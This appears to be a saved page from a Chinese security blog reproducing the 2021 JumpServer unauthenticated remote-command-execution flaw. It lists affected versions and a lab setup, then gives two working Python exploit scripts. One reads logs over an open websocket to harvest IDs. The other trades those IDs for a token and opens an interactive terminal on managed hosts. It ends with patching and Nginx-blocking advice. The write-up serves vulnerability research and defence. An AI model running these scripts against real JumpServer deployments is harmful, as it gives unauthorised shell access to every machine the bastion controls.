@@ -1,0 +1,294 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JumpServer RCE 漏洞复现 | 离沫凌天๓</title><meta name="keywords" content="Python,Vulnerability,WebSocket,RCE"><meta name="author" content="离沫凌天๓"><meta name="copyright" content="离沫凌天๓"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="简介JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统，通俗来说就是跳板机。JumpServer 使用 Python &#x2F; Django 进行开发。 漏洞详情2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JumpServer RCE 漏洞复现">
+<meta property="og:url" content="https://www.lintstar.top/2021/01/a3a6c3e5.html">
+<meta property="og:site_name" content="离沫凌天๓">
+<meta property="og:description" content="简介JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统，通俗来说就是跳板机。JumpServer 使用 Python &#x2F; Django 进行开发。 漏洞详情2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qiniuyun.lintstar.top/hexo/20210201132315.webp">
+<meta property="article:published_time" content="2021-01-31T04:00:58.000Z">
+<meta property="article:modified_time" content="2021-02-02T05:29:33.000Z">
+<meta property="article:author" content="离沫凌天๓">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Vulnerability">
+<meta property="article:tag" content="WebSocket">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qiniuyun.lintstar.top/hexo/20210201132315.webp"><link rel="shortcut icon" href="/plogo/favicon-32x32.png"><link rel="canonical" href="https://www.lintstar.top/2021/01/a3a6c3e5"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-02 13:29:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="referrer" content="no-referrer-when-downgrade" /><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/plogo/Alogo.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw far fa-calendar-alt"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-tools"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/shell-java/"><i class="fa-fw fas fa-rocket"></i><span> Shell 编码</span></a></li><li><a class="site-page" href="https://www.lintstar.top/tools/Reverse-shell.html"><i class="fa-fw fas fa-terminal"></i><span> 反弹 Shell</span></a></li><li><a class="site-page" href="/hw/"><i class="fa-fw fas fa-shield-alt"></i><span> HW 小工具</span></a></li><li><a class="site-page" href="https://www.lintstar.top/tools/Avsearch.html"><i class="fa-fw fas fa-biohazard"></i><span> AV Search</span></a></li><li><a class="site-page" href="https://www.lintstar.top/tools/Windows-log.html"><i class="fa-fw fab fa-windows"></i><span> Events Log</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-crown"></i><span> JAY</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" target="_blank" rel="noopener" href="https://y.qq.com/n/yqq/singer/0025NhlN2yWrP4.html"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://kg.qq.com/node/personal?uid=669a9d862c2e3e8337"><i class="fa-fw fas fa-headphones-alt"></i><span> Songs</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://qiniuyun.lintstar.top/hexo/20210201132315.webp)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">离沫凌天๓</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw far fa-calendar-alt"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-tools"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/shell-java/"><i class="fa-fw fas fa-rocket"></i><span> Shell 编码</span></a></li><li><a class="site-page" href="https://www.lintstar.top/tools/Reverse-shell.html"><i class="fa-fw fas fa-terminal"></i><span> 反弹 Shell</span></a></li><li><a class="site-page" href="/hw/"><i class="fa-fw fas fa-shield-alt"></i><span> HW 小工具</span></a></li><li><a class="site-page" href="https://www.lintstar.top/tools/Avsearch.html"><i class="fa-fw fas fa-biohazard"></i><span> AV Search</span></a></li><li><a class="site-page" href="https://www.lintstar.top/tools/Windows-log.html"><i class="fa-fw fab fa-windows"></i><span> Events Log</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-crown"></i><span> JAY</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" target="_blank" rel="noopener" href="https://y.qq.com/n/yqq/singer/0025NhlN2yWrP4.html"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://kg.qq.com/node/personal?uid=669a9d862c2e3e8337"><i class="fa-fw fas fa-headphones-alt"></i><span> Songs</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">JumpServer RCE 漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-31T04:00:58.000Z" title="发表于 2021-01-31 12:00:58">2021-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-02T05:29:33.000Z" title="更新于 2021-02-02 13:29:33">2021-02-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Note/">Note</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Note/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统，通俗来说就是跳板机。JumpServer 使用 Python / Django 进行开发。</strong></p>
+<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p><strong>2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器，执行任意命令。</strong></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li><p><strong>JumpServer &lt; v2.6.2</strong></p>
+</li>
+<li><p><strong>JumpServer &lt; v2.5.4</strong></p>
+</li>
+<li><p><strong>JumpServer &lt; v2.4.5</strong></p>
+</li>
+<li><p><strong>JumpServer = v1.5.9</strong></p>
+</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>JumpServer v2.6.1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行脚本并运行</span></span><br><span class="line">➜ curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh| bash</span><br><span class="line">➜ ./quick_start.sh</span><br><span class="line">➜ <span class="built_in">cd</span> /opt/jumpserver-installer-v2.6.2</span><br><span class="line">➜ ./jmsctl.sh start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果安装版本不是 v2.6.1</span></span><br><span class="line">➜ ./jmsctl.sh upgrade v2.6.1</span><br></pre></td></tr></table></figure>
+
+<p><strong>访问 <a target="_blank" rel="noopener" href="http://ip:8080/">http://IP:8080</a> 初始账号密码为 admin/admin</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210202122948.png" alt="image-20210202122948517"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li><strong>未授权的情况下能够建立 websocket 连接</strong></li>
+<li><strong>task 可控，可以通过 websocket 对日志文件进行读取</strong></li>
+<li><strong>需要通过 <code>/opt/jumpserver/logs/jumpserver</code> 获取 <code>system_user</code> 、<code>user</code> 、<code>asset</code> 三个 id 的值</strong></li>
+<li><strong>通过这三个 id 获取一个临时 token</strong></li>
+<li><strong>通过临时 token 进入 koko 的 tty，然后执行命令</strong></li>
+</ol>
+<p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210202123659.png" alt="image-20210202123659105"></p>
+<h2 id="漏洞脚本"><a href="#漏洞脚本" class="headerlink" title="漏洞脚本"></a>漏洞脚本</h2><p><strong>运行脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/ws/ops/tasks/log/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">t</span>):</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(t) <span class="keyword">as</span> client:</span><br><span class="line">        <span class="keyword">await</span> client.send(json.dumps(&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;/opt/jumpserver/logs/gunicorn&quot;</span>&#125;))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ret = json.loads(<span class="keyword">await</span> client.recv())</span><br><span class="line">            print(ret[<span class="string">&quot;message&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://45.xx.xx.xx:8080&quot;</span></span><br><span class="line">    target = host.replace(<span class="string">&quot;https://&quot;</span>, <span class="string">&quot;wss://&quot;</span>).replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;ws://&quot;</span>) + url</span><br><span class="line">    print(<span class="string">&quot;target: %s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic(target))</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取到 <code>asset</code> ，<code>system_user</code> ，<code>user</code> 三个ID值：</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210131203700.png" alt="image-20210131203700482"></p>
+<blockquote>
+<p><strong>或者使用 chorme 插件读取：<a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related">WebSocket Test Client</a></strong></p>
+</blockquote>
+<p><strong>将 <code>asset</code> ，<code>system_user</code> ，<code>user</code> 三个ID值填入下面脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aioconsole</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_celery_task_log_path</span>(<span class="params">task_id</span>):</span></span><br><span class="line">    task_id = <span class="built_in">str</span>(task_id)</span><br><span class="line">    rel_path = os.path.join(task_id[<span class="number">0</span>], task_id[<span class="number">1</span>], task_id + <span class="string">&quot;.log&quot;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&quot;/opt/jumpserver/&quot;</span>, rel_path)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket, _text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_loop</span>(<span class="params">ws, session_id</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmdline = <span class="keyword">await</span> aioconsole.ainput()</span><br><span class="line">        <span class="keyword">await</span> send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;<span class="string">&quot;id&quot;</span>: session_id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmdline + <span class="string">&quot;\n&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">recv_loop</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_text = <span class="keyword">await</span> ws.recv()</span><br><span class="line">        ret = json.loads(recv_text)</span><br><span class="line">        <span class="keyword">if</span> ret.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;TERMINAL_DATA&quot;</span>):</span><br><span class="line">            <span class="keyword">await</span> aioconsole.aprint(ret[<span class="string">&quot;data&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>():</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> client:</span><br><span class="line">        recv_text = <span class="keyword">await</span> client.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        session_id = json.loads(recv_text)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span> + session_id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: session_id,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> send_msg(client, inittext)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://45.xx.xx.xx:8080&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    <span class="keyword">if</span> host[-<span class="number">1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        host = host[:-<span class="number">1</span>]</span><br><span class="line">    print(host)</span><br><span class="line">    data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;eb02ebb2-62f9-43fc-8eb3-25a84ff27e95&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;2bc20e9a-523d-4219-8087-75cd73bbd998&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;bd6e6ee6-8f89-46c9-b907-58126d40dc84&quot;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    res = requests.post(host + url, json=data)</span><br><span class="line">    token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    target = (</span><br><span class="line">        <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功获取权限：</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210131210222.png" alt="image-20210131210222612"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p><strong>1、建议 JumpServer 堡垒机（含社区版及企业版）用户升级至安全版本</strong></p>
+<p><strong>2、临时修复方案：</strong></p>
+<p><strong>修改 Nginx 配置文件，以屏蔽漏洞接口 ：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/v1/authentication/connection-token/</span><br><span class="line">/api/v1/users/connection-token/</span><br></pre></td></tr></table></figure>
+
+<p><strong>Nginx 配置文件位置如下：</strong></p>
